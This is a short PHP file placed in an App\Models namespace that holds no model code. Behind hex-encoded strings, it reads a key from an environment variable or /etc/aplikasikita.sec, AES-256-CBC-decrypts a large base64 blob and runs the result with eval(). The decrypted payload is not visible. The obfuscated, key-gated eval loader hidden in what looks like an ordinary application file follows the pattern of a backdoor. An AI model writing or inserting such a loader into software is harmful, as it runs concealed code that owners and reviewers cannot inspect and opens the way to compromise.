<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5WdAIP46EllbDpSFRIU2lA==');

$c=base64_decode(

'G3j+yhVF48gvtfwsuTt2cfXn2H3tjW7Z20HA87J1LDXxEgKSIeNo9NvtMkr83az0wRKsjIhgorVo' .
'6NdF9uQkCZqStiwDyo+iUbU8NsXtin/xX32jtWuS7GYWRtc4Ed5SegOD1vr6fIVMxmFUwNWuPqKd' .
'JJdVpbvDjzR4NcrTf5umV6mrc6NbjC7Wje6XOHUGXDX7FbswgR8EmZQF3IS1ZBGtRlME1vycX7sq' .
'WEtLL3oqYEI6wiPyRgFtmMrlQGCUBCDJAE597/7AQ+RQW86IP7LDCMFIRNulLXA21uDCgFDiFSBK' .
'Fm5lt3qQF1ZGuhnCaoIx0QfjUw0g5H20ZtIdLgGZZfjBqf4lGpiUsT+9cxPOzGjkFCz4f7SfR3m9' .
'gXfZt1Yo1taZOHzDC50rUkY5tsT7sBdbfZ92MGuM5I+kcd9DZqjTEgYcwLgcO7mfGZUoNTgHiz8D' .
'6ME/2m/Oe9CN5HLDHG/i7nVxZGVgHyuHdK8nr1VaZk6uVG9ETCgQbNrvnvFuRHx5GPMnRZF5qAqu' .
'mk9QmJpJMin/dcaFilaTIZo2zPuauuSuRpJHWKi5BGQ0msklF4MqjVMFPCI58k+o+41m6TaM3yv4' .
'XJo3tioHP1p1zr/WJCwl+n5mv8opUsg+RpFVCUQZWVhtD7kyD6HvmLAZgnmRVMk7nIcpU2NbftkK' .
'WNPJXidPB+h7hTSI+oZxFoRgTuWweaFQib6nkJX7srgejaqdoA6IU+3GHzlK4H0Zvsv6snCaexly' .
'XuNZdDsQncexXF3XdaPGW/NpnkqR9bRNzkF3v/tuNhwlyWXnaRNoiD7DHUwFvRebRpxOFC0E9USH' .
'4G4OWFAskzqm2caDvXqh6rIkUHnUIM369/sg/XBI6nUkIYONgZkpKnfgjqZpq9t2/ikxk6irkbe9' .
'ClTBZKqCC8enJQvlEhHjovCl0rJQYFqt6T1UmZlLCT+ozAaUsZEDvCcX2cncr4TefVGfKjK9tr6V' .
'Z9dAb5FpT0Racl7oNd+scVKdTw6ne2Sfel0WTJe0ke4KFKLFXU46P3EEUcdJzK7nNRsPnWx8apQG' .
'15ydx8W0TVww6VZN/mCQPrdjJGhhUTcDeDDG6A3jxt8ZyAAhApQfV0uRwuBo9iLsJNSzAcM5Ekx8' .
'KA4O95avwtP+f+5//l26vy1X5p73ENdFZmaqF1TYzxlJ9ggz56MYByqEiC8bf7ppanNT7hdJataq'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

